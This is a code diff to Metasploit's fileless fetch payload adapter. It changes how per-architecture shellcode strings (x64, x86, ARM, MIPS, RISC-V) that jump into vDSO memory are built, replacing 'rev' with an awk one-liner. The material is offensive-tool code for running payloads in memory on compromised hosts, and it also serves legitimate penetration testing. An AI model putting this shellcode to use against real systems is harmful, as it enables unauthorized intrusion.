@@ -186,7 +186,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     end
     return payload
   end
-
+  
   def _generate_jmp_instruction(arch)
     #
     # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
@@ -196,25 +196,25 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # mov rax, [target address]
     # jmp rax
     when 'x64'
-      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+      %^"48b8"$(echo $(printf %016x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     
     # x86 shellcode
     # mov eax, [target address]
     # jmp eax
     when 'x86'
-      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+      %^"b8"$(echo $(printf %08x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     
     # ARM64 shellcode
     # ldr x0, #8
     # br x0
     when 'aarch64'
-      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')^
     
     # ARMle shelcode
     # ldr.w r2, [pc, #4]
     # bx    r2 
     when 'armle'
-      %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"dff804201047"$(echo $(printf %04x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')^
     
     # ARMbe shelcode
     # ldr.w r2, [pc, #4]
@@ -228,7 +228,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # lw	$t2, 16($ra)
     # jr $t2
     when 'mipsle'
-      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %04x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')^
     
     # MIPSBE shellcode
     # bgezal $zero, 4
@@ -252,7 +252,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr    t0
     # .dword [target address]
     when 'riscv64le'
-      %^"9702000083b2c20067800200"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"9702000083b2c20067800200"$(echo $(printf %016x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')^
 
     # RISC-V 32-bit LE shellcode
     # auipc t0, 0
@@ -260,7 +260,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr    t0
     # .word [target address]
     when 'riscv32le'
-      %^"9702000083a2c20067800200"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"9702000083a2c20067800200"$(echo $(printf %08x $vdso_addr) | awk -vFS= '{do printf $(NF);while(--NF>0);print ""}' | sed -E 's/(.)(.)/\\2\\1/g')^
 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
